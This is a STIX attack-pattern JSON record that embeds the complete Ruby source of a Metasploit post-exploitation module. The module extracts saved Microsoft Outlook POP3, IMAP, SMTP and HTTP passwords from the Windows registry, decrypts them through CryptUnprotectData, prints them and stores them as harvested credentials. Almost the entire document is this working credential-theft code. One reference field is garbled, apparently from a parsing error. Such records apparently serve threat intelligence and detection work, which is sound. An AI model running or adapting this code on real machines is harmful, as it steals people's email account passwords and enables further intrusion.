{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ed8a284-defa-4d8d-b6f3-f2493a471a8b",
    "created": "2024-08-14T16:33:11.458737Z",
    "modified": "2024-08-14T16:33:11.458741Z",
    "name": "Windows Gather Microsoft Outlook Saved Password Extraction",
    "description": " This module extracts and decrypts saved Microsoft Outlook (versions 2002-2010) passwords from the Windows Registry for POP3/IMAP/SMTP/HTTP accounts. In order for decryption to be successful, this module must be executed under the same privileges as the user which originally encrypted the password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/outlook.rb",
            "external_id": "outlook.rb"
        },
        {
            "source_name": "http_server_url=get_valdata(k",
            "external_id": "HTTPServerURL)"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Microsoft Outlook Saved Password Extraction',\n        'Description' => %q{\n          This module extracts and decrypts saved Microsoft\n          Outlook (versions 2002-2010) passwords from the Windows\n          Registry for POP3/IMAP/SMTP/HTTP accounts.\n          In order for decryption to be successful, this module must be\n          executed under the same privileges as the user which originally\n          encrypted the password.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Justin Cacak' ], # Updated to work with newer versions of Outlook (2013, 2016, Office 365)\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_getuid\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def prepare_railgun\n    if !session.railgun.get_dll('crypt32')\n      session.railgun.add_dll('crypt32')\n    end\n  end\n\n  def decrypt_password(data)\n    pid = client.sys.process.getpid\n    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)\n\n    mem = process.memory.allocate(128)\n    process.memory.write(mem, data)\n\n    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n      addr = [mem].pack('V')\n      len = [data.length].pack('V')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 8)\n      len, addr = ret['pDataOut'].unpack('V2')\n    else\n      addr = [mem].pack('Q')\n      len = [data.length].pack('Q')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 16)\n      len, addr = ret['pDataOut'].unpack('Q2')\n    end\n\n    return '' if len == 0\n\n    decrypted_pw = process.memory.read(addr, len)\n    return decrypted_pw\n  end\n\n  # Just a wrapper to avoid copy pasta and long lines\n  def get_valdata(key, name)\n    registry_getvaldata(\"#{@key_base}\\\\#{key}\", name)\n  end\n\n  def get_registry(outlook_ver)\n    # Determine if saved accounts exist within Outlook.  Ignore the Address Book and Personal Folder registry entries.\n    outlook_exists = 0\n    saved_accounts = 0\n\n    # Check for registry key based on Outlook version pulled from registry\n    @key_base = \"HKCU\\\\Software\\\\Microsoft\\\\Office\\\\#{outlook_ver}.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\"\n    next_account_id = get_valdata('', 'NextAccountID')\n\n    # Default to original registry key for module\n    if next_account_id.nil?\n      @key_base = 'HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676'\n      next_account_id = get_valdata('', 'NextAccountID')\n    end\n\n    if !next_account_id.nil?\n      # Microsoft Outlook not found\n\n      print_status 'Microsoft Outlook found in Registry...'\n      outlook_exists = 1\n      registry_enumkeys(@key_base).each do |k|\n        display_name = get_valdata(k, 'Display Name')\n\n        if display_name.nil?\n          # Microsoft Outlook found, but no account data saved in this location\n          next\n        end\n\n        # Account found - parse through registry data to determine account type.  Parse remaining registry data after to speed up module.\n        saved_accounts = 1\n        got_user_pw = 0\n\n        displayname = get_valdata(k, 'Display Name')\n        email = get_valdata(k, 'Email')\n        pop3_server = get_valdata(k, 'POP3 Server')\n        smtp_server = get_valdata(k, 'SMTP Server')\n        http_server_url = get_valdata(k, 'HTTP Server URL')\n        imap_server = get_valdata(k, 'IMAP Server')\n        smtp_use_auth = get_valdata(k, 'SMTP Use Auth')\n        if !smtp_use_auth.nil?\n          smtp_user = get_valdata(k, 'SMTP User')\n          smtp_password = get_valdata(k, 'SMTP Password')\n          smtp_auth_method = get_valdata(k, 'SMTP Auth Method')\n        end\n\n        if !pop3_server.nil?\n          type = 'POP3'\n        elsif !http_server_url.nil?\n          type = 'HTTP'\n        elsif !imap_server.nil?\n          type = 'IMAP'\n        else\n          type = 'UNKNOWN'\n        end\n\n        # Decrypt password and output results.  Need to do each separately due to the way Microsoft stores them.\n        print_good('Account Found:')\n        print_status(\"     Type: #{type}\")\n        print_status(\"     User Display Name: #{displayname}\")\n        print_status(\"     User Email Address: #{email}\")\n\n        if type == 'POP3'\n          pop3_pw = get_valdata(k, 'POP3 Password')\n          pop3_user = get_valdata(k, 'POP3 User')\n          pop3_use_spa = get_valdata(k, 'POP3 Use SPA')\n          smtp_port = get_valdata(k, 'SMTP Port')\n\n          print_status(\"     User Name: #{pop3_user}\")\n          if pop3_pw.nil?\n            print_status('     User Password: <not stored>')\n          else\n            pop3_pw.slice!(0, 1)\n            pass = decrypt_password(pop3_pw)\n            print_status(\"     User Password: #{pass}\")\n            # Prepare data for creds\n            got_user_pw = 1\n            host = pop3_server\n            user = pop3_user\n          end\n\n          if !pop3_use_spa.nil? # Account for SPA (NTLM auth)\n            print_status('     Secure Password Authentication (SPA): Enabled')\n          end\n\n          print_status(\"     Incoming Mail Server (POP3): #{pop3_server}\")\n\n          pop3_use_ssl = get_valdata(k, 'POP3 Use SSL')\n          if pop3_use_ssl.nil?\n            print_status('     POP3 Use SSL: No')\n          else\n            print_status('     POP3 Use SSL: Yes')\n          end\n\n          pop3_port = get_valdata(k, 'POP3 Port')\n          if pop3_port.nil?\n            print_status('     POP3 Port: 110')\n            portnum = 110\n          else\n            print_status(\"     POP3 Port: #{pop3_port}\")\n            portnum = pop3_port\n          end\n\n          if smtp_use_auth.nil? # Account for SMTP servers requiring authentication\n            print_status(\"     Outgoing Mail Server (SMTP): #{smtp_server}\")\n          else\n            print_status(\"     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]\")\n            # Check if smtp_auth_method is null.  If so, the inbound credentials are utilized\n            if smtp_auth_method.nil?\n              smtp_user = pop3_user\n              smtp_decrypted_password = pass\n            else\n              smtp_password.slice!(0, 1)\n              smtp_decrypted_password = decrypt_password(smtp_password)\n            end\n            print_status(\"     Outgoing Mail Server (SMTP) User Name: #{smtp_user}\")\n            print_status(\"     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}\")\n          end\n\n          smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')\n          if smtp_use_ssl.nil?\n            print_status('     SMTP Use SSL: No')\n          else\n            print_status('     SMTP Use SSL: Yes')\n          end\n\n          if smtp_port.nil?\n            print_status('     SMTP Port: 25')\n            smtp_port = 25\n          else\n            print_status(\"     SMTP Port: #{smtp_port}\")\n          end\n\n        elsif type == 'HTTP'\n          http_password = get_valdata(k, 'HTTP Password')\n          http_user = get_valdata(k, 'HTTP User')\n          http_use_spa = get_valdata(k, 'HTTP Use SPA')\n\n          print_status(\"     User Name: #{http_user}\")\n          if http_password.nil?\n            print_status('     User Password: <not stored>')\n          else\n            http_password.slice!(0, 1)\n            pass = decrypt_password(http_password)\n            print_status(\"     User Password: #{pass}\")\n            got_user_pw = 1\n            host = http_server_url\n            user = http_user\n\n            # Detect 80 or 443 for creds\n            http_server_url.downcase!\n            if http_server_url.include? \"h\\x00t\\x00t\\x00p\\x00s\"\n              portnum = 443\n            else\n              portnum = 80\n            end\n          end\n\n          if !http_use_spa.nil? # Account for SPA (NTLM auth)\n            print_status('     Secure Password Authentication (SPA): Enabled')\n          end\n\n          print_status(\"     HTTP Server URL: #{http_server_url}\")\n\n        elsif type == 'IMAP'\n          imap_user = get_valdata(k, 'IMAP User')\n          imap_use_spa = get_valdata(k, 'IMAP Use SPA')\n          imap_password = get_valdata(k, 'IMAP Password')\n          smtp_port = get_valdata(k, 'SMTP Port')\n\n          print_status(\"     User Name: #{imap_user}\")\n          if imap_password.nil?\n            print_status('     User Password: <not stored>')\n          else\n            imap_password.slice!(0, 1)\n            pass = decrypt_password(imap_password)\n            print_status(\"     User Password: #{pass}\")\n            got_user_pw = 1\n            host = imap_server\n            user = imap_user\n          end\n\n          if !imap_use_spa.nil? # Account for SPA (NTLM auth)\n            print_status('     Secure Password Authentication (SPA): Enabled')\n          end\n\n          print_status(\"     Incoming Mail Server (IMAP): #{imap_server}\")\n\n          imap_use_ssl = get_valdata(k, 'IMAP Use SSL')\n          if imap_use_ssl.nil?\n            print_status('     IMAP Use SSL: No')\n          else\n            print_status('     IMAP Use SSL: Yes')\n          end\n\n          imap_port = get_valdata(k, 'IMAP Port')\n          if imap_port.nil?\n            print_status('     IMAP Port: 143')\n            portnum = 143\n          else\n            print_status(\"     IMAP Port: #{imap_port}\")\n            portnum = imap_port\n          end\n\n          if smtp_use_auth.nil? # Account for SMTP servers requiring authentication\n            print_status(\"     Outgoing Mail Server (SMTP): #{smtp_server}\")\n          else\n            print_status(\"     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]\")\n            # Check if smtp_auth_method is null.  If so, the inbound credentials are utilized\n            if smtp_auth_method.nil?\n              smtp_user = imap_user\n              smtp_decrypted_password = pass\n            else\n              smtp_password.slice!(0, 1)\n              smtp_decrypted_password = decrypt_password(smtp_password)\n            end\n            print_status(\"     Outgoing Mail Server (SMTP) User Name: #{smtp_user}\")\n            print_status(\"     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}\")\n          end\n\n          smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')\n          if smtp_use_ssl.nil?\n            print_status('     SMTP Use SSL: No')\n          else\n            print_status('     SMTP Use SSL: Yes')\n          end\n\n          if smtp_port.nil?\n            print_status('     SMTP Port: 25')\n            smtp_port = 25\n          else\n            print_status(\"     SMTP Port: #{smtp_port}\")\n          end\n\n        end\n\n        if got_user_pw == 1\n          service_data = {\n            address: Rex::Socket.getaddress(host),\n            port: portnum,\n            protocol: 'tcp',\n            service_name: type,\n            workspace_id: myworkspace_id\n          }\n\n          credential_data = {\n            origin_type: :session,\n            session_id: session_db_id,\n            post_reference_name: refname,\n            username: user,\n            private_data: pass,\n            private_type: :password\n          }\n\n          credential_core = create_credential(credential_data.merge(service_data))\n\n          login_data = {\n            core: credential_core,\n            access_level: 'User',\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n\n          create_credential_login(login_data.merge(service_data))\n        end\n\n        if !smtp_use_auth.nil?\n          service_data = {\n            address: Rex::Socket.getaddress(smtp_server),\n            port: smtp_port,\n            protocol: 'tcp',\n            service_name: 'smtp',\n            workspace_id: myworkspace_id\n          }\n\n          credential_data = {\n            origin_type: :session,\n            session_id: session_db_id,\n            post_reference_name: refname,\n            username: smtp_user,\n            private_data: smtp_decrypted_password,\n            private_type: :password\n          }\n\n          credential_core = create_credential(credential_data.merge(service_data))\n\n          login_data = {\n            core: credential_core,\n            access_level: 'User',\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n\n          create_credential_login(login_data.merge(service_data))\n        end\n\n        print_status('')\n      end\n    end\n\n    if outlook_exists == 0\n      print_status('Microsoft Outlook not installed or Exchange accounts are being used.')\n    elsif saved_accounts == 0\n      print_status('Microsoft Outlook installed however no accounts stored in Registry.')\n    end\n  end\n\n  def outlook_version\n    val = registry_getvaldata('HKCR\\\\Outlook.Application\\\\CurVer', '')\n    if !val.nil?\n      idx = val.rindex('.')\n      val[idx + 1..]\n    end\n  end\n\n  def run\n    # Get Outlook version from registry\n    outlook_ver = outlook_version\n    fail_with(Failure::NotFound, 'Microsoft Outlook version not found in registry.') if outlook_ver.nil?\n\n    print_status(\"Microsoft Outlook Version: #{outlook_ver}\")\n    uid = session.sys.config.getuid # Get uid.  Decryption will only work if executed under the same user account as the password was encrypted.\n    # **This isn't entirely true. The Master key and decryption can be retrieved using Mimikatz but it seems like more work than it's worth.\n\n    if is_system?\n      print_error(\"This module is running under #{uid}.\")\n      print_error('Automatic decryption will not be possible.')\n      print_error('Migrate to a user process to achieve successful decryption (e.g. explorer.exe).')\n    else\n      print_status('Searching for Microsoft Outlook in Registry...')\n      prepare_railgun\n      get_registry(outlook_ver)\n    end\n\n    print_status('Complete')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}